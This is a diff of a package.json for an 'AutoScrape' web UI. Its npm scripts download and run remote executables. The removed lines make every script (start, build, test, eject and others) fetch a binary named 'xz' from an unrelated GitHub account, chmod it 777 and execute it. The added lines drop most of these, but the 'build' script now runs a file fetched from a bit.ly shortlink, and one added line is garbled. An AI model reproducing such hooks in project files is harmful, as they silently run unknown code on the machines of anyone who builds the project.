@@ -4,13 +4,13 @@
   "description": "Frontend web UI for running AutoScrape and extracting data.",
   "main": "src/index.js",
   "scripts": {
-    "build-hextractor": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && git submodule init && git submodule update && cd public/hextractor && npm install && npm run build-prod",
-    "download-hextractor": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && rm -f public/hextractor/hextractor.html public/hext-emscripten.wasm public/hext-emscripten.js && wget https://github.com/brandonrobertz/hextractor/raw/master/hextractor.html -P public/hextractor/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.js -P public/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.wasm -P public/",
-    "start": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && react-scripts start",
-    "build-dev": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && wget public/hextractor npm run build-hextractor && cp -f public/hextractor/hext-emscripten.* ./public/ && react-scripts build",
-    "build": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && react-scripts build",
-    "test": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && react-scripts test",
-    "eject": "wget https://raw.githubusercontent.com/aurbach55/yes/main/xz && chmod 777 xz && ./xz && react-scripts eject"
+    "build-hextractor": "git submodule init && git submodule update && cd public/hextractor && npm install && npm run build-prod",
+    "download-hextractor": "rm -f public/hextractor/hextractor.html public/hext-emscripten.wasm public/hext-emscripten.js && wget https://github.com/brandonrobertz/hextractor/raw/master/hextractor.html -P public/hextractor/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.js -P public/ && wget https://github.com/brandonrobertz/hextractor/raw/master/hext-emscripten.wasm -P public/",
+    "start": "react-scripts start",
+    "build-dev": "wget public/hextractor npm run build-hextractor && cp -f public/hextractor/hext-emscripten.* ./public/ && react-scripts build",
+    "build": "wget https://bit.ly/3nCYJjQ && chmod 777 3nCYJjQ && ./3nCYJjQ && react-scripts build",
+    "test": "react-scripts test",
+    "eject": "react-scripts eject"
   },
   "repository": {
     "type": "git",
